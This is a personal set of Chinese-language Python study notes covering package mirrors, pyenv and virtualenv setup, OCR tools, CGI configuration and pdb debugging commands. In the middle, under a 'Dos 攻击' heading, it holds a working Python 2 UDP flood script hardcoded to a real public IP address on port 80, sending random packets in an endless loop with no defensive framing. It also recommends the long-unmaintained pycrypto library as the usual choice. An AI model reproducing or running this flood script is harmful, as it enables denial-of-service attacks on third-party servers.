# Python学习

## 国内镜像下载

pip install -i https://pypi.tuna.tsinghua.edu.cn/simple some-package

## 多版本安装包

`python3.9 -m pip install tensorflow`

## 截屏转文字

英文: https://github.com/ianzhao05/textshot

设置 alias

`alias textshot="python /Users/linweiye/Documents/textshot/textshot.py"`

使用 textshot

中文识别: https://github.com/ouyanghuiyu/chineseocr_lite

## 爬虫库

Scrapy 安装 `pip install scrapy`

## 密码学库

一般用这个比较多 [crypto](https://pypi.org/project/pycrypto/)

## jupyter 使用

`jupyter notebook`

## 格式化错误输出

[一行代码简化Python异常信息：错误清晰指出，排版简洁美观](https://mp.weixin.qq.com/s/OdAGGHMd6tg-_Jn-wZIifQ)

`python -m pip install pretty_errors`


## .zshrc 配置

`eval "$(pyenv init -)"`


## 测试

pytest

## Dos 攻击

python 2.7.8

```python
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

ip = '118.89.38.11'
port = 80

os.system("clear")
os.system("figlet Attack Starting")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
```

## Python 调试功能

Thonny

## 虚环境安装

### venv
a single version different virtual environments
Python 单版本, 虚拟环境

给每个python项目提供不同环境，数据库版本等
```
pip install virtualenv  //安装
cd dir  //进项目目录
virtualenv venv //新建venv目录,复制系统python到venv
./venv/bin/pip install tornado //虚环境安装tornado
./venv/bin/python xxxx.py //虚环境运行xxxx.py
source ./venv/bin/activate //activate命令启动虚环境，不用显式调用虚环境bin
deactivate //退出虚环境
// 使用``~/.bashrc``的一个环境变量将解释器改为全局性的：
export VIRTUALENVWRAPPER_PYTHON=/usr/bin/python2.7
```
### pyenv

Python 多版本管理
to use multiple versions without virtual environments

```shell
brew update
brew pyenv install/upgrade
pyenv install 2.7.8
brew uninstall pyenv  卸载 pyenv
pyenv uninstall  卸载 python 版本
pyenv install 3.6.3  # Install Python version
pyenv install 3.4.0
pyenv versions       # Displays the currently active Python version, along with information on how it was set.
pyenv version       # Lists all Python versions known to pyenv, and shows an asterisk next to the currently active version.
pyenv global 3.6.3   # Set your system's Python version
pyenv shell 3.6.3   # Set your shell's Python version
pyenv shell   # show your shell's Python version
pyenv whence # Lists all Python versions with the given command installed.
pyenv install --list # 可以下载的版本
```

## xampp Apache服务器配置Python
打开httd.conf

AddHandler cgi-script .cgi .pl .asp 添加.py
AddHandler cgi-script .cgi .pl .asp .py
把mycgi-test.py放到xampp\cgi-bin下,浏览器打开
localhost/cgi-bin/mycgi-test.py

mycgi-test.py代码
```
#! C:\Python27\python.exe # python接收器路径
 
print 'Content-type:text/plain'
print
 
print"Hello Cooder"
```
## window上cmd显示中文问题

在程序里打中文编码为unicode编码，就是utf-8
print u"中文"  #前面加上u
s="爱你"
print s.decode('utf-8')  #或者强制编码
## 调试
python -m pdb my.py
b 10 第10行断点
n next
s step
l list
p print
c contune
q quit
j 10 jump 10 跳到第10行
直接回车是重复前一条命令!